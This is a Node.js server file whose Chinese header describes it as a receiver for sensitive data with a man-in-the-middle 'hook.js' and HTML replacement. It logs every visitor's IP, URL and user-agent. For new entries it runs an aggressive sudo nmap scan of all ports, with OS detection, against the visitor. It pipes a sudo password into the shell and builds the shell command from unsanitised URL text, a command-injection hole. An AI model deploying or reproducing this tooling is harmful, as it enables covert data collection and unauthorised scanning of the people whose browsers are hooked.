/* 
1、接收敏感信息
2、生成动态代理,为动态代理提供服务
3、中间人hook.js
4、html替换
*/
var fs  = require("fs"),
	http = require("http"),
	a = process.argv.splice(2),
    request = require("request"),
    g_aProxy = null,
    child_process = require("child_process"),
    nPort = 8080,
    moment = require('moment'),
    szIp = "0.0.0.0";

process.on('uncaughtException', function(e){console.log(e);});
process.on('unhandledRejection', function(e){console.log(e);});

function fnGetIp(req)
{
	var ip = req.connection.remoteAddress ||req.socket.remoteAddress || req.connection.socket.remoteAddress;
	ip = ip.split(',')[0];
	ip = ip.split(':').slice(-1);
	return ip;
}

function fnWt(ip,s)
{
	fs.appendFileSync("data/" + ip + ".txt", s + "\n");
	try{
		var a = s.split(/\t/),szName = /\/([^\/]+)\//gmi.exec(s)[1],szFn = "data/nmap/" + szName + ".xml ";
		console.log([ip,szName,a[0]]);
		if(!fs.existsSync(szFn))
			child_process.exec("echo ${rtpswd} | sudo -S nmap --host-timeout=100m  --max-rtt-timeout=3000ms --initial-rtt-timeout=1000ms --min-rtt-timeout=1000ms --max-retries=2 --stats-every 10s --min-hostgroup=64 --min-rate=500 --traceroute -PS1-65535 -A -O -oX " + szFn + " " + ip + " &",function(e,so,se){});
	}catch(e){console.log(e);}
}

// 主程序
function fnHttpServer(options)
{
	options || (options = {});
	options.ip || (options.ip = szIp);
	options.port || (options.port = nPort);
	var nTimeout = 19000, server = http.createServer(function (req, resp)
	{
		var ip = fnGetIp(req).toString();
		// hook.js
		if(-1 == req.url.indexOf("hook.js"))
		fnWt(ip,[moment(new Date().getTime()).format('YYYY-MM-DD HH:mm:ss'),req.url,req.headers["user-agent"]].join("\t"));
		// console.log([moment(new Date().getTime()).format('YYYY-MM-DD HH:mm:ss'), ip,req.url,req.headers["user-agent"]]);
		resp.end();
	});
	server.on('clientError', (err, socket) => 
	{
	});
	server.on('close', (err) => {
	});
	server.on('connect', (request, socket,headBuffer) => 
	{
	});
	/*
	server.on('request', (request,response) => 
	{
		let body = [];
		request.on('data', (chunk) => {
		  body.push(chunk);
		}).on('end', () => {
		  body = Buffer.concat(body);
		  var fs = require("fs");
		  fs.writeFileSync("testAmf.bin",body);
		  console.log(body.toString());
		});
	});
	///*/
	server.on('upgrade', (request, socket,headBuffer) => {
	});
	server.listen(options.port,options.ip,function()
	{
		console.log("start: " + options.ip + ":" + options.port);
	});
	server.maxHeadersCount = 2000;

	// 超时设置
	server.setTimeout(nTimeout);
	server.timeout = nTimeout;
	server.keepAliveTimeout = nTimeout;
}
// 启动多个
// pm2 start ProxyServer.js -i max
process.setMaxListeners(0);
require('events').EventEmitter.prototype._maxListeners = 0;
require('events').EventEmitter.defaultMaxListeners = 0;
fnHttpServer();
fnHttpServer({ip:"0.0.0.0",port:3000});
